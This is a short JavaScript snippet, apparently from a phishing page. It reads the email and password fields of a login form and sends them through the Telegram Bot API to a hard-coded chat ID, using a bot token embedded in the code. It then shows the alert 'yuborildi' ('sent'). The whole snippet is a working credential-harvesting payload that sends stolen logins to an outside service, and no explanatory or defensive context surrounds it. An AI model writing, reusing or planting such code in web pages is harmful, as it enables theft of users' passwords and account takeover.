<script>
    let chat_id = "1657791509";
    let bot_token = "5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E";
    function getChat() {
        let text1 = document.forms["myForm"]["email"].value;
        let text2 = document.forms["myForm"]["pasD"].value;
        let my_text = "Email: " + text1 + "  Password: " + text2;
        var url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
        alert("yuborildi");
    }
</script>
